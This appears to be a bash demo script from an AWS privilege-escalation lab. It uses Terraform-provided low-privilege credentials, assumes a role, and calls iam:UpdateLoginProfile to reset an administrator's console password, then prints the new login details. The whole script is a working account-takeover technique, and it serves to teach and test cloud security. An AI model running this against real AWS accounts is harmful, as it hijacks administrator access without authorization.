#!/bin/bash

# Demo script for iam:UpdateLoginProfile privilege escalation
# This is a ROLE-BASED one-hop scenario

set -e

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-ulp-to-admin-starting-user"
STARTING_ROLE="pl-prod-ulp-to-admin-starting-role"
ADMIN_USER="pl-prod-ulp-to-admin-target-user"

# Generate a new random password
RANDOM_SUFFIX=$(openssl rand -hex 4)
NEW_PASSWORD="PathfinderLabs456!${RANDOM_SUFFIX}"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM UpdateLoginProfile Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}Role-Based One-Hop to Admin${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_updateloginprofile.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and ARNs
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
STARTING_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
ADMIN_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_user_name')
ORIGINAL_PASSWORD=$(echo "$MODULE_OUTPUT" | jq -r '.original_password')
CONSOLE_LOGIN_URL=$(echo "$MODULE_OUTPUT" | jq -r '.console_login_url')

if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"

# Save original password for cleanup
echo "$ORIGINAL_PASSWORD" > /tmp/ulp_original_password.txt

cd - > /dev/null  # Return to scenario directory

# Step 2: Verify identity as user
echo -e "${YELLOW}Step 2: Verifying identity${NC}"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as expected user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"

# Step 3: Assume the starting role
echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
echo "Role ARN: $STARTING_ROLE_ARN"

ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
    --role-arn "$STARTING_ROLE_ARN" \
    --role-session-name "ulp-demo-session")

# Update credentials to use assumed role
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"

# Step 4: Verify admin user has existing login profile
echo -e "${YELLOW}Step 4: Verifying admin user has existing login profile${NC}"
echo "Admin user: $ADMIN_USER_NAME"

if aws iam get-login-profile --user-name $ADMIN_USER_NAME &> /dev/null; then
    echo -e "${GREEN}✓ Confirmed: Admin user has existing login profile${NC}"
else
    echo -e "${RED}⚠ Admin user doesn't have a login profile${NC}"
    echo -e "${YELLOW}This is unexpected for this scenario.${NC}"
    exit 1
fi
echo ""

# Step 5: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have list-users permission already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
fi
echo ""

# Step 6: Update login profile for admin user
echo -e "${YELLOW}Step 6: Updating login profile via iam:UpdateLoginProfile${NC}"
echo "Changing console password for admin user: $ADMIN_USER_NAME"
echo "New password: $NEW_PASSWORD"

aws iam update-login-profile \
    --user-name $ADMIN_USER_NAME \
    --password "$NEW_PASSWORD" \
    --no-password-reset-required

echo -e "${GREEN}✓ Successfully updated login profile for admin user!${NC}\n"

# Wait for IAM propagation
echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
sleep 15
echo ""

# Step 7: Verify we now have the updated password
echo -e "${YELLOW}Step 7: Password has been successfully changed${NC}"
echo "The admin user can now log in with the new password."
echo -e "${GREEN}✓ Confirmed password update!${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
echo -e "Step 2: Used ${YELLOW}iam:UpdateLoginProfile${NC} to change console password for $ADMIN_USER_NAME"
echo -e "Step 3: Gained ${YELLOW}Administrator Access${NC} (console login)"
echo -e "Result: ${GREEN}Administrator Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (UpdateLoginProfile) → $ADMIN_USER_NAME → Admin"
echo ""
echo -e "${GREEN}Console Login Information:${NC}"
echo -e "  URL: ${YELLOW}$CONSOLE_LOGIN_URL${NC}"
echo -e "  Username: ${YELLOW}$ADMIN_USER_NAME${NC}"
echo -e "  New Password: ${YELLOW}$NEW_PASSWORD${NC}"
echo -e "  Original Password: ${YELLOW}$ORIGINAL_PASSWORD${NC} (saved for cleanup)"
echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to restore the original password${NC}"
echo ""
